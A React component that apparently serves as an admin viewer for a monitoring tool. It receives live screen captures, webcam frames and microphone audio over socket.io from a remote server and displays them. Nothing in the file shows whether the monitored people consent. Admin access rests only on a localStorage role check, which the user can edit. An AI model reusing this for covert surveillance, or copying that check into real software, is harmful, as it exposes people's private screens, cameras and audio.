import React, { useEffect, useState, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import Navbar from "../components/Navbar";
import { io } from "socket.io-client";

const socket = io("https://flask-1-usdt.onrender.com", {
  transports: ["websocket"],
  reconnectionAttempts: 5,
  timeout: 2000,
});

const Viewer = () => {
  const [params] = useSearchParams();
  const type = params.get("type");
  const navigate = useNavigate();

  const [screenData, setScreenData] = useState("");
  const audioQueue = useRef([]);
  const videoQueue = useRef([]);
  const audioRef = useRef(null);
  const videoRef = useRef(null);

  // Role check
  useEffect(() => {
    const role = localStorage.getItem("role");
    if (!role || role !== "admin") {
      navigate("/");
    }
  }, []);

  // Utility: base64 to Blob
  const base64ToBlob = (base64, mime) => {
    const byteChars = atob(base64);
    const byteArray = new Uint8Array(
      Array.from(byteChars).map((c) => c.charCodeAt(0))
    );
    return new Blob([byteArray], { type: mime });
  };

  // Audio playback
  useEffect(() => {
    if (type !== "audio") return;

    const interval = setInterval(() => {
      if (audioQueue.current.length === 0) return;

      const chunk = audioQueue.current.shift();
      const blob = new Blob([chunk], { type: "audio/wav" });
      const url = URL.createObjectURL(blob);
      if (audioRef.current) {
        audioRef.current.src = url;
        audioRef.current.play().catch(() => {});
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [type]);

  // Video frame render
  useEffect(() => {
    if (type !== "video") return;

    const interval = setInterval(() => {
      if (videoQueue.current.length === 0) return;

      const base64 = videoQueue.current.shift();
      const imgElement = videoRef.current;
      if (imgElement) {
        imgElement.src = `data:image/jpeg;base64,${base64}`;
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [type]);

  // Sockets
  useEffect(() => {
    console.log("🧭 Viewer mounted for:", type);
    socket.emit("join-room", "admin-room");

    if (type === "screen") {
      socket.on("screen-data", (d) => {
        console.log("🖥 Screen-data received:", d);
        const base64 = typeof d === "string" ? d : d?.data || "";
        if (base64) {
          setScreenData(`data:image/jpeg;base64,${base64}`);
        }
      });
    }

    if (type === "video") {
      socket.on("video-data", (d) => {
        const base64 = typeof d === "string" ? d : d?.data || "";
        if (base64) videoQueue.current.push(base64);
      });
    }

    if (type === "audio") {
      socket.on("audio-data", (d) => {
        const chunk = d?.data || d;
        if (chunk) audioQueue.current.push(chunk);
      });
    }

    return () => {
      socket.off("screen-data");
      socket.off("video-data");
      socket.off("audio-data");
    };
  }, [type]);

  return (
    <div>
      <Navbar />
      <h2>
        Viewing:{" "}
        {type === "screen" ? "Screen" : type === "video" ? "Video" : "Audio"}
      </h2>

      {type === "screen" && (
        <>
          {!screenData && (
            <p style={{ color: "red" }}>⚠️ Waiting for screen-data...</p>
          )}
          <img
            src={screenData}
            alt="Live Screen"
            style={{ width: "640px", height: "360px", border: "1px solid gray" }}
          />
        </>
      )}

      {type === "video" && (
        <img
          ref={videoRef}
          alt="Webcam Snapshot"
          style={{ width: "640px", height: "360px", border: "1px solid gray" }}
        />
      )}

      {type === "audio" && <audio ref={audioRef} controls autoPlay />}
    </div>
  );
};

export default Viewer;
